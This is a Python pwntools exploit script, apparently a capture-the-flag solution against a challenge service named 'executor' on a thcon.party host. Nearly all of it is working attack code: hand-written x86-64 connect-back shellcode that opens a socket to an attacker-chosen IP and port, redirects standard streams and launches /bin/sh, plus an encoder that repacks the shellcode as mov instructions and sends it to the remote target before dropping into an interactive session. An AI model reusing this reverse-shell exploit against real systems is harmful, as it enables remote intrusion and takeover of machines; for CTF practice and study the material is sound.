#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

exe = ELF('./executor')

host, port = "challenges1.thcon.party", "523"

p = remote(host,port)

# fill with IP address of remote server that will receive connect back shellcode
IP, PORT = (sys.argv[1], int(sys.argv[2],10)) if len(sys.argv) > 2 else ('127.0.0.1', 8080)

def sockaddr():
    family = struct.pack('H', socket.AF_INET)
    portbytes = struct.pack('H', socket.htons(PORT))
    ipbytes = socket.inet_aton(IP)
    number = struct.unpack('Q', family + portbytes + ipbytes)
    number = -number[0]        #negate
    return hex((number + (1 << 64)) % (1 << 64))


# connect back shellcode
shellc1 = asm ('''
socket:
        push 41
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
	syscall
connect:
	xchg eax,edi
	mov al,42
        mov rcx,%s
        neg rcx
        push rcx
        push rsp
        pop rsi
        mov dl,16
        syscall
dup2:
	push 3
        pop rsi
dup2_loop:
        mov al,33
        dec esi
        syscall
        jnz dup2_loop
execve:
	cdq
	push rdx
	mov rcx, 0x68732f2f6e69622f
	push rcx
	push rsp
	pop rdi
	mov al, 59
	syscall
''' % (sockaddr()))

shellc1 = shellc1.ljust( ( (len(shellc1)+7)>>3)*8, b'\x90')

print('len shellcode = '+str(len(shellc1)))

# generate shellcode encoder with mov instructions
total = ((len(shellc1)>>3)*14)+1
source = ''
pos = 0
source += 'mov dl,'+hex(total)+'\n'
for i in range(len(shellc1)>>3):
  val = u64(shellc1[i*8:(i+1)*8])
  source += 'mov rax,'+hex(val)+'\n'
  source += 'mov '+hex(i*8)+'[rdx],rax\n'
  pos += 14
source +='end\n'

p.send(source)

p.interactive()


